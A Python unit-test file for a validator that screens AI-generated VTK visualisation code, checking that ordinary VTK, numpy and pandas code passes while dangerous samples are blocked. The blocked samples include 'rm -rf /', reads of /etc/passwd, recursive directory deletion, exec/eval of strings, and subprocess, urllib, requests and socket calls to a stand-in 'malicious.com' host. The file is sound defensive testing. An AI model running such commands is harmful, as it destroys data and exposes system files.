#!/usr/bin/env python3
"""
Unit Tests for Security Validator

Tests the VTKCodeSafetyValidator to ensure it properly blocks dangerous
code patterns while allowing legitimate VTK operations.
"""

import unittest
import sys
from pathlib import Path

# Add module path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'llm-generation'))

from security_validator import VTKCodeSafetyValidator


class TestVTKCodeSafetyValidator(unittest.TestCase):
    """Test security validation for generated code"""
    
    def setUp(self):
        """Create validator instance"""
        self.validator = VTKCodeSafetyValidator()
    
    # ========== SAFE CODE TESTS (Should Pass) ==========
    
    def test_vtk_io_allowed(self):
        """VTK I/O operations should be allowed"""
        code = """
from vtkmodules.vtkIOGeometry import vtkSTLReader
from vtkmodules.vtkIOImage import vtkPNGWriter

# Read STL file
reader = vtkSTLReader()
reader.SetFileName('model.stl')
reader.Update()

# Write image
writer = vtkPNGWriter()
writer.SetFileName('output.png')
writer.Write()
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe, f"VTK I/O should be allowed. Issues: {issues}")
        self.assertEqual(len(issues), 0)
    
    def test_pandas_io_allowed(self):
        """Pandas file I/O should be allowed"""
        code = """
import pandas as pd
import numpy as np

# Read CSV data
df = pd.read_csv('points.csv')
points = df[['x', 'y', 'z']].values
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe, f"Pandas I/O should be allowed. Issues: {issues}")
    
    def test_vtk_rendering_allowed(self):
        """Standard VTK rendering code should be allowed"""
        code = """
from vtkmodules.vtkFiltersSources import vtkCylinderSource
from vtkmodules.vtkRenderingCore import vtkPolyDataMapper, vtkActor, vtkRenderer, vtkRenderWindow

cylinder = vtkCylinderSource()
cylinder.SetResolution(50)

mapper = vtkPolyDataMapper()
mapper.SetInputConnection(cylinder.GetOutputPort())

actor = vtkActor()
actor.SetMapper(mapper)

renderer = vtkRenderer()
renderer.AddActor(actor)

render_window = vtkRenderWindow()
render_window.AddRenderer(renderer)
render_window.Render()
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe, f"VTK rendering should be allowed. Issues: {issues}")
    
    def test_numpy_operations_allowed(self):
        """Numpy operations should be allowed"""
        code = """
import numpy as np

points = np.array([[0, 0, 0], [1, 1, 1], [2, 2, 2]])
distances = np.linalg.norm(points, axis=1)
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe, f"Numpy operations should be allowed. Issues: {issues}")
    
    # ========== DANGEROUS CODE TESTS (Should Fail) ==========
    
    def test_open_function_blocked(self):
        """Direct Python open() should be blocked"""
        code = """
with open('/etc/passwd', 'r') as f:
    data = f.read()
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "open() should be blocked")
        self.assertGreater(len(issues), 0)
        self.assertTrue(any('open' in issue.lower() for issue in issues))
    
    def test_os_system_blocked(self):
        """os.system() should be blocked"""
        code = """
import os
os.system('rm -rf /')
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "os.system should be blocked")
        self.assertTrue(any('system' in issue.lower() for issue in issues))
    
    def test_subprocess_blocked(self):
        """subprocess module should be blocked"""
        code = """
import subprocess
subprocess.run(['curl', 'malicious.com'])
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "subprocess should be blocked")
        self.assertTrue(any('subprocess' in issue.lower() for issue in issues))
    
    def test_eval_blocked(self):
        """eval() should be blocked"""
        code = """
user_input = "malicious code"
eval(user_input)
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "eval() should be blocked")
        self.assertTrue(any('eval' in issue.lower() for issue in issues))
    
    def test_exec_blocked(self):
        """exec() should be blocked"""
        code = """
malicious_code = "import os; os.system('bad')"
exec(malicious_code)
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "exec() should be blocked")
        self.assertTrue(any('exec' in issue.lower() for issue in issues))
    
    def test_pathlib_blocked(self):
        """pathlib.Path() should be blocked"""
        code = """
from pathlib import Path
p = Path('/etc/passwd')
content = p.read_text()
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "pathlib.Path should be blocked")
        # Should catch either the import or the Path() usage
        self.assertGreater(len(issues), 0)
    
    def test_urllib_blocked(self):
        """urllib should be blocked"""
        code = """
import urllib.request
data = urllib.request.urlopen('http://malicious.com').read()
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "urllib should be blocked")
        self.assertTrue(any('urllib' in issue.lower() for issue in issues))
    
    def test_requests_blocked(self):
        """requests library should be blocked"""
        code = """
import requests
response = requests.get('http://malicious.com')
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "requests should be blocked")
        self.assertTrue(any('requests' in issue.lower() for issue in issues))
    
    def test_socket_blocked(self):
        """socket operations should be blocked"""
        code = """
import socket
s = socket.socket()
s.connect(('malicious.com', 80))
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "socket should be blocked")
        self.assertTrue(any('socket' in issue.lower() for issue in issues))
    
    def test_shutil_blocked(self):
        """shutil operations should be blocked"""
        code = """
import shutil
shutil.rmtree('/important/directory')
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "shutil should be blocked")
        self.assertTrue(any('shutil' in issue.lower() for issue in issues))
    
    def test_os_remove_blocked(self):
        """os.remove() should be blocked"""
        code = """
import os
os.remove('important_file.txt')
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "os.remove should be blocked")
        self.assertTrue(any('remove' in issue.lower() for issue in issues))
    
    # ========== IMPORT VALIDATION TESTS ==========
    
    def test_allowed_imports(self):
        """Should allow whitelisted imports"""
        code = """
from vtkmodules.vtkFiltersSources import vtkCylinderSource
import vtk
import numpy as np
import pandas as pd
import math
import random
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe, f"Allowed imports should pass. Issues: {issues}")
    
    def test_disallowed_imports(self):
        """Should block non-whitelisted imports"""
        code = """
import pickle
import json
import csv
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe, "Non-whitelisted imports should be blocked")
        self.assertGreater(len(issues), 0)
    
    # ========== EDGE CASES ==========
    
    def test_syntax_error_passes(self):
        """Syntax errors should not fail security check (will be caught by syntax validator)"""
        code = """
def broken syntax here
"""
        is_safe, issues = self.validator.validate_code(code)
        # Security validator lets syntax errors pass (syntax validator will catch them)
        self.assertTrue(is_safe)
    
    def test_empty_code_passes(self):
        """Empty code should pass security check"""
        code = ""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe)
    
    def test_comments_only_passes(self):
        """Code with only comments should pass"""
        code = """
# This is a comment
# Another comment
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertTrue(is_safe)
    
    def test_multiple_issues_detected(self):
        """Should detect multiple security issues"""
        code = """
import os
import subprocess
os.system('bad command')
subprocess.run(['another', 'bad', 'command'])
eval('malicious')
"""
        is_safe, issues = self.validator.validate_code(code)
        self.assertFalse(is_safe)
        # Should detect multiple issues
        self.assertGreaterEqual(len(issues), 3)
    
    # ========== UTILITY METHODS TESTS ==========
    
    def test_get_allowed_imports(self):
        """Should return set of allowed imports"""
        allowed = self.validator.get_allowed_imports()
        self.assertIsInstance(allowed, set)
        self.assertIn('vtkmodules', allowed)
        self.assertIn('numpy', allowed)
        self.assertIn('pandas', allowed)
    
    def test_format_issues(self):
        """Should format issues as readable text"""
        issues = ["Issue 1", "Issue 2", "Issue 3"]
        formatted = self.validator.format_issues(issues)
        self.assertIn("Issue 1", formatted)
        self.assertIn("Issue 2", formatted)
        self.assertIn("Issue 3", formatted)
    
    def test_format_no_issues(self):
        """Should handle empty issues list"""
        formatted = self.validator.format_issues([])
        self.assertIn("No security issues", formatted)


if __name__ == '__main__':
    unittest.main(verbosity=2)
